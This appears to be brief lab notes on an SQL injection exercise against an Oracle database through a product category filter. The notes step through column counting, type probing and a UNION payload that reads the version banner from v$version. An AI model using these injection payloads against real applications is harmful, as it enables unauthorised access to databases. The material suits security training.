Lab 07 - SQL injection attack, querying the database type and version Oracle 

SQL Injection - Project Category Filter

End Goal - Display the database version string 

Analysis:

(1) Determine the number of columns
' order by 3 - - --> ınternal server error

3 - 1 = 2

(2) Determıne the data type of columns

' UNION SELECT 'a', 'a' from DUAL-- --> Oracle Database

(3) Output the versıon of the database

' UNION SELECT banner, NULL from v$version--

SELECT banner FROM v$version
